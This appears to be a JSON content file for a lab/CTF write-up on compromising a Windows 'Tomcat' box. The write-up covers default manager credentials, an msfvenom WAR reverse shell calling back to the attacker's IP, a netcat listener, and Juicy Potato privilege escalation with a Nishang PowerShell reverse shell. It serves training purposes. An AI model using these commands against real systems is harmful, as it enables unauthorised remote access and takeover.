{
    "note":"title must match route name in App.js",
    "title":"Tomcat",
    "path":"tomcat",
    "tags":["easy","ctf", "box", "htb","web","cms", "powershell", "iwr", "python webserver", "apache 2.4.43","chisel","cloudme 1.11.2","curl","download file","nsfvenom","port forwarding","powershell iwr", "windows","winpeas","Gym Manager 1.0", "privesc"],
    "date":"27/06/2023",
    "location": "./writeup/",
    "banner":"writeup/tomcat/banner.gif",
    "type":"writeup",
    "search":[
        {
            "section":"Scanning",
            "description":"Scanning the network /24 finding the host exposing posts 22 SSh, 135 msrpc, 139 netbios-ssn, 445 microsoft-ds?, 3389 ssl/ms-wbt-server?, 8080 http, 49154 msrpc, 49155 msrpc and 49156 msrpc"
        },
        {
            "section":"Tomcat credentials",
            "description":"Accessing Tomcat admin panel with default credentials"
        },
        {
            "section":"Reverse shell",
            "description":"Exploying a reverse shell with a malicious .war file generated with msfvenom to exploit Apache Server"
        },
        {
            "section":"Reverse shell",
            "description":"Executing the reverse shell by visiting the .war file upload path and receiving the connection back to the Netcat (nc) listener"
        },
        {
            "section":"Reverse shell",
            "description":"Listin the tasks of the target machine from CMD"
        },
        {
            "section":"Missconfigurations",
            "description":"Discovering SeImpersonatePrivilege missconfiguration"
        },
        {
            "section":"Privilege escalation",
            "description":"Privilege escalation (PrivEsc) with Jucy-Potato by executing it give as paramenter the Nihsang shell"
        },
        {
            "section":"Privilege escalation",
            "description":"Downloading the reverse shell with Python web server into the target machine"
        }
    ],
    "body":[
        {
            "id":"Ignite",
            "title":"<h1> <span style=\"color:#da1953\">Tom</span>cat</h1><hr>",
            "body":[
                {
                    "id":"banner",
                    "title":"",
                    "body":[
                        "<img src=\"/cyber/writeup/tomcat/banner.gif\" alt=\"\">"
                    ]
                },
                {
                    "id":"Scanning",
                    "title":"<hr><h1><span style=\"color:#da1953\">Sca</span>nning</h1>",
                    "body":[
                        "<p>Enumerating <em>192.169.22.100/24</em> to find the host running Apache with nmap <code>nmap -sC -sV 192.168.22.100/24</code>. After the Apache scan it appears to be running on <em>192.168.22.150</em>.</p>",
                        "<p><pre>Nmap scan report for 192.168.22.150<br>Host is up (0.042s latency).<br>Not shown: 991 filtered ports<br>PORT      STATE SERVICE            VERSION<br>22/tcp    open  ssh                OpenSSH for_Windows_8.1 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 6f:b4:44:da:96:20:97:54:e8:1a:9e:61:96:8f:da:95 (RSA)<br>|   256 87:ac:a8:b4:fa:2f:bd:e5:35:15:c1:01:5c:8d:e7:fd (ECDSA)<br>|_  256 aa:7b:1c:8c:1a:52:b3:40:a8:0e:47:c9:c9:e0:a5:ba (ED25519)<br>135/tcp   open  msrpc              Microsoft Windows RPC<br>139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds?<br>3389/tcp  open  ssl/ms-wbt-server?<br>| rdp-ntlm-info: <br>|   Target_Name: UK<br>|   NetBIOS_Domain_Name: UK<br>|   NetBIOS_Computer_Name: TOMCAT<br>|   DNS_Domain_Name: uk.mwr.com<br>|   DNS_Computer_Name: TOMCAT.uk.mwr.com<br>|   DNS_Tree_Name: mwr.com<br>|   Product_Version: 6.3.9600<br>|_  System_Time: 2021-06-05T13:08:40+00:00<br>| ssl-cert: Subject: commonName=TOMCAT.uk.mwr.com<br>| Not valid before: 2021-01-28T11:47:11<br>|_Not valid after:  2021-07-30T11:47:11<br>8080/tcp  open  http               Apache Tomcat 8.5.50<br>|_http-favicon: Apache Tomcat<br>|_http-open-proxy: Proxy might be redirecting requests<br>|_http-title: Apache Tomcat/8.5.50<br>49154/tcp open  msrpc              Microsoft Windows RPC<br>49155/tcp open  msrpc              Microsoft Windows RPC<br>49156/tcp open  msrpc              Microsoft Windows RPC<br>MAC Address: 00:15:5D:15:04:02 (Microsoft)<br>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows<br></pre></p>"
                    ]
                },
                {
                    "id":"Tomcat credentials",
                    "title":"<h1><span style=\"color:#da1953\">Tom</span>cat credentials</h1>",
                    "body":[
                        "<p>The default credentials are <b>tomcat:tomcat</b> which I guessed tried some common combination of username and password.</p>"
                    ]
                },
                {
                    "id":"Reverse shell",
                    "title":"<h1><span style=\"color:#da1953\">Rev</span>erse shell</h1>",
                    "body":[
                        "<p>To be able to see under which user the Tomcat service is running I need to have access to the server. Since I have access to the Tomcat Manager page, I can upload a malicious war file to get a reverse shell.</p>",
                        "<p>To create the malicious war file, I use the following command: <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.22.2 LPORT=4444 -f war &gt; shell.war</code> Where the IP is the one assigned to me at the interface Tap0 and a port of my choice.</p>",
                        "<p><img src=\"/cyber/writeup/tomcat/8213f2c1eb5549339e6b0b773ce64c6e.png\"></p>",
                        "<p>Now I must listen to the port chosen by me (4444) waiting for the incoming connection upon uploading the malicious war file, in order to receive the conneciton I have to execute the following commands <code>nc -lvp 4444</code>.</p>",
                        "<p><img src=\"/cyber/writeup/tomcat/e7893a774fbb4eeea8e8b2edd5f2036e.png\"></p>",
                        "<p>From the Tomcat manager page, I must upload the malicious war file created.</p>",
                        "<p><img src=\"/cyber/writeup/tomcat/64642cbd358b4f7cb7605045a0803267.png\"></p>",
                        "<p>To get a connection I must navigate to the path where the file was uploaded by clicking the link or writing the URL in the browser. In this way the malicious code inside the war file will be executed and it will try to connec to the given IP and PORT.</p>",
                        "<p><img src=\"/cyber/writeup/tomcat/fdfaa8c703c04b1ea4d5db63fefca8cb.png\"></p>",
                        "<p><img src=\"/cyber/writeup/tomcat/2c61db120a9443f4bc3b02d350aea0d9.png\"></p>",
                        "<p>At this point, I have a connection and I am given a shell.</p>",
                        "<p><img src=\"/cyber/writeup/tomcat/83059155708a4a9a8477ba957ec456f0.png\"></p>",
                        "<p>Now finally I can check under which user the service Tomcat is running. To see the list of processes I ran the command <code>tasklist /V</code>, and the Tomcat service appears to be run by <em>AUTHORITY\\LOCAL SERVICE</em> which does not have elevated privilege.</p>",
                        "<p><img src=\"/cyber/writeup/tomcat/9d804782f597427d9f3b13652f9eeddb.png\"></p>",
                        ""

                    ]
                },
                {
                    "id":"Missconfigurations",
                    "title":"<h1><span style=\"color:#da1953\">Mis</span>sconfigurations</h1>",
                    "body":[
                        "<p>After searching for a misconfiguration I found that <em>SeImpersonatePrivilege</em> is enabled by russing <code>whoami /all</code>.</p>",
                        "<p><img src=\"/cyber/writeup/tomcat/661371e0a3c34651a8c5fdc3dfb5a78c.png\"></p>",
                        "<p>So now I can try some tools to gain privileged access to the box.</p>"
                    ]
                },
                {
                    "id":"Privilege escalation",
                    "title":"<h1><span style=\"color:#da1953\">Pri</span>vilege escalation</h1>",
                    "body":[
                        "<p>In order to read the flag.txt file I had to privilege escalation since the normal shell did not  me to read it and did not have the permissions. To do privilege escalation I used a tool called <em>juicy-potato</em>. Before running this tool, I had to prepare a reverse PowerShell and a Nihsang shell obtained from <a data-from-md title='https://github.com/samratashok/nishang' href='https://github.com/samratashok/nishang'>GitHub</a>. The shell in question is called <em>Invoke-PowerShellTcp.ps1</em> to which I set the parameters as follows.</p>",
                        "<p><img src=\"/cyber/writeup/tomcat/a32de62d8bc54dc092fb5c4e2b4a5b29.png\"></p>",
                        "<p>The IP address is the IP address assigned to my tap0 interface while the port is my choice.</p>",
                        "<p><img src=\"/cyber/writeup/tomcat/0adcf3fa59074225a5dde9f087010cb6.png\"></p>",
                        "<p>Also, I have prepared a bat file that runs the reverse PowerShell in the following way: <code>powershell.exe -ExecutionPolicy Unrestricted -Command &quot;C:\\Users\\Public\\Downloads\\rev.ps1&quot;</code></p>",
                        "<p><img src=\"/cyber/writeup/tomcat/96016da9af7a4da8a4b3f8d8130e72d5.png\"></p>",
                        "<p>Remember to use an absolute path otherwise, it might not work! Then I uploaded the juicy-potato, reverse PowerShell and the bat file to the server via the Python webserver.</p>",
                        "<p><img src=\"/cyber/writeup/tomcat/3632eb85dedf4edc9a06dcf2933aafbb.png\"></p>",
                        "<p><img src=\"/cyber/writeup/tomcat/fcfafd6879ba43d6b046a8d9c2daca90.png\"></p>",
                        "<p>After obtaining all the three necessary elements, I used juicy-potato (renamed as j.exe) to create an elevated process that reconnected to my listening netcat in order to obtain a privileged reverse shell. <code>j.exe -t * -p C:\\Users\\Public\\Downloads\\rev.bat -l 9001</code> Note that here port 9001 doesn't matter so I can put whatever I want</p>",
                        "<p><img src=\"/cyber/writeup/tomcat/813cc540a1c448ac85eee6695ce28b79.png\"></p>",
                        "<p><img src=\"/cyber/writeup/tomcat/18d8f9083d0f4719b72d0b21b032e1dc.png\"></p>"
                    ]
                }
            ]
        }
    ]
}
